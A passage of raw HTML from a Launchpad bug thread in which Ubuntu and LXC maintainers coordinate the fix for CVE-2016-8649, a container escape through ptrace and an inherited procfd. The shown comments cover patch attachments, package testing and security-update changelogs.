     <textarea style="width: 100%" rows="10">FYI, updated ptrace patchset by Eric, sent for inclusion: https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/44" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sforshee" class="sprite person">Seth Forshee (sforshee)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-17T20:19:38+00:00" title="2016-11-17 20:19:38 UTC">on 2016-11-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/44"> #44</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On Thu, Nov 17, 2016 at 05:45:30PM -0000, Stéphane Graber wrote:<br />
<span class="foldable-quoted">
&gt; FYI, updated ptrace patchset by Eric, sent for inclusion:<br />
&gt; <a rel="nofollow" href="https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html">https:/<wbr />/lists.<wbr />linuxfoundation<wbr />.org/pipermail/<wbr />containers/<wbr />2016-November/<wbr />037647.<wbr />html</a>
</span></p>
<p>Note that these are follow-ups to the other patch (mm: Add a user_ns<br />
owner to mm_struct and fix ptrace permission checks), not replacements.<br />
As far as I can tell they address different issues than those under<br />
discussion here.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On Thu, Nov 17, 2016 at 05:45:30PM -0000, Stéphane Graber wrote:
&gt; FYI, updated ptrace patchset by Eric, sent for inclusion:
&gt; https://lists.linuxfoundation.org/pipermail/containers/2016-November/037647.html

Note that these are follow-ups to the other patch (mm: Add a user_ns
owner to mm_struct and fix ptrace permission checks), not replacements.
As far as I can tell they address different issues than those under
discussion here.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/45" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-18T01:29:04.242454+00:00" title="2016-11-18 01:29:04 UTC">on 2016-11-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/45"> #45</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The LXC issue of passing the procfd to the attached process has been assigned CVE-2016-8649.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The LXC issue of passing the procfd to the attached process has been assigned CVE-2016-8649.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/46" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-18T04:25:07.764799+00:00" title="2016-11-18 04:25:07 UTC">on 2016-11-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/46"> #46</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@brauner: Can you provide a version of your patch for both stable-1.0 and stable-2.0 branches as they stand today (other than the CVE fix, they&#x27;re ready for the point release).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@brauner: Can you provide a version of your patch for both stable-1.0 and stable-2.0 branches as they stand today (other than the CVE fix, they're ready for the point release).</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/47" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-18T16:06:59.447518+00:00" title="2016-11-18 16:06:59 UTC">on 2016-11-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/47"> #47</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4779383/+files/0001-attach-do-not-send-procfd-to-attached-process.patch">LXC patch for master.</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4779383">Edit</a>
        (14.8 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>LXC patch for master.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">LXC patch for master.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/48" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-18T16:07:35.998853+00:00" title="2016-11-18 16:07:35 UTC">on 2016-11-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/48"> #48</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4779384/+files/0001-attach-do-not-send-procfd-to-attached-process_stable-2.0.patch">LXC patch for stable-2.0.</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4779384">Edit</a>
        (15.3 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>LXC patch for stable-2.0.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">LXC patch for stable-2.0.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/49" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-18T16:08:08.190774+00:00" title="2016-11-18 16:08:08 UTC">on 2016-11-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/49"> #49</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/+attachment/4779385/+files/0001-attach-do-not-send-procfd-to-attached-process_stable-1.0.patch">LXC patch for stable-1.0.</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1639345/+attachment/4779385">Edit</a>
        (15.4 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>LXC patch for stable-1.0.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">LXC patch for stable-1.0.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/50" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-22T06:35:24.420407+00:00" title="2016-11-22 06:35:24 UTC">on 2016-11-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/50"> #50</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Packages for all Ubuntu releases have been uploaded to the LXC security PPA: <a rel="nofollow" href="https://launchpad.net/~ubuntu-lxc-security/+archive/ubuntu/devirt-security/+packages">https:/<wbr />/launchpad.<wbr />net/~ubuntu-<wbr />lxc-security/<wbr />+archive/<wbr />ubuntu/<wbr />devirt-<wbr />security/<wbr />+packages</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Packages for all Ubuntu releases have been uploaded to the LXC security PPA: https://launchpad.net/~ubuntu-lxc-security/+archive/ubuntu/devirt-security/+packages</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/51" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbrauner" class="sprite person">Christian Brauner (cbrauner)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-22T22:38:56.795548+00:00" title="2016-11-22 22:38:56 UTC">on 2016-11-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/51"> #51</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I tested packages for all Ubuntu releases and they seem to work fine. I can start privileged and unprivileged containers and attach to them without any further problems. I tested this inside of proper virtual machines with low-level LXC and nesting with LXD.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I tested packages for all Ubuntu releases and they seem to work fine. I can start privileged and unprivileged containers and attach to them without any further problems. I tested this inside of proper virtual machines with low-level LXC and nesting with LXD.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/52" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-22T23:47:49.872382+00:00" title="2016-11-22 23:47:49 UTC">on 2016-11-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/52"> #52</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve tested the {yakkety,<wbr />xenial,<wbr />trusty}<wbr />-{i386,<wbr />amd64} packages by doing upgrade testing and also tested lxc-{create,<wbr />start,ls,<wbr />info,attach,<wbr />stop,destroy} with privileged and unprivileged containers. All testing went as expected.</p>
<p>I also compared the amd64 build logs between what&#x27;s currently in -updates and the binary packages built in the PPA. They&#x27;re all clean.</p>
<p>I&#x27;ll publish to {yakkety,<wbr />xenial,<wbr />trusty}<wbr />-security on the CRD tomorrow and then publish a USN. Thanks to you all!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've tested the {yakkety,xenial,trusty}-{i386,amd64} packages by doing upgrade testing and also tested lxc-{create,start,ls,info,attach,stop,destroy} with privileged and unprivileged containers. All testing went as expected.

I also compared the amd64 build logs between what's currently in -updates and the binary packages built in the PPA. They're all clean.

I'll publish to {yakkety,xenial,trusty}-security on the CRD tomorrow and then publish a USN. Thanks to you all!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/53" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sforshee" class="sprite person">Seth Forshee (sforshee)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-23T04:20:51.551844+00:00" title="2016-11-23 04:20:51 UTC">on 2016-11-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/53"> #53</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve verified the ptrace fix in all -proposed kernels.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've verified the ptrace fix in all -proposed kernels.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: verification-done-trusty verification-done-vivid verification-done-xenial verification-done-yakkety<br />removed: verification-needed-trusty verification-needed-vivid verification-needed-xenial verification-needed-yakkety
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/54" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-23T16:13:17.272524+00:00" title="2016-11-23 16:13:17 UTC">on 2016-11-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/54"> #54</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 1.0.8-0ubuntu0.4</p>
<p>---------------<br />
lxc (1.0.8-0ubuntu0.4) trusty-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: <a href="/bugs/1639345" class="bug-link">#1639345</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- attach: Do not send procfd to attached process<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2016-8649</p>
<p>&nbsp;-- Stéphane Graber &lt;email address hidden&gt;  Tue, 22 Nov 2016 00:49:00 -0500</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 1.0.8-0ubuntu0.4

---------------
lxc (1.0.8-0ubuntu0.4) trusty-security; urgency=medium

  * SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
    - attach: Do not send procfd to attached process
    - CVE-2016-8649

 -- Stéphane Graber &lt;stgraber@ubuntu.com&gt;  Tue, 22 Nov 2016 00:49:00 -0500</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu Trusty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/55" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-23T16:13:25.989989+00:00" title="2016-11-23 16:13:25 UTC">on 2016-11-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/55"> #55</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package lxc - 2.0.5-0ubuntu1.2</p>
<p>---------------<br />
lxc (2.0.5-0ubuntu1.2) yakkety-security; urgency=medium</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: Escape through ptrace and inherited fd (LP: <a href="/bugs/1639345" class="bug-link">#1639345</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- attach: Do not send procfd to attached process<br />
&nbsp;&nbsp;&nbsp;&nbsp;- CVE-2016-8649</p>
<p>&nbsp;-- Stéphane Graber &lt;email address hidden&gt;  Tue, 22 Nov 2016 00:49:00 -0500</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package lxc - 2.0.5-0ubuntu1.2

---------------
lxc (2.0.5-0ubuntu1.2) yakkety-security; urgency=medium

  * SECURITY UPDATE: Escape through ptrace and inherited fd (LP: #1639345)
    - attach: Do not send procfd to attached process
    - CVE-2016-8649

 -- Stéphane Graber &lt;stgraber@ubuntu.com&gt;  Tue, 22 Nov 2016 00:49:00 -0500</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu Yakkety): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/56" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-23T16:13:34.532882+00:00" title="2016-11-23 16:13:34 UTC">on 2016-11-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
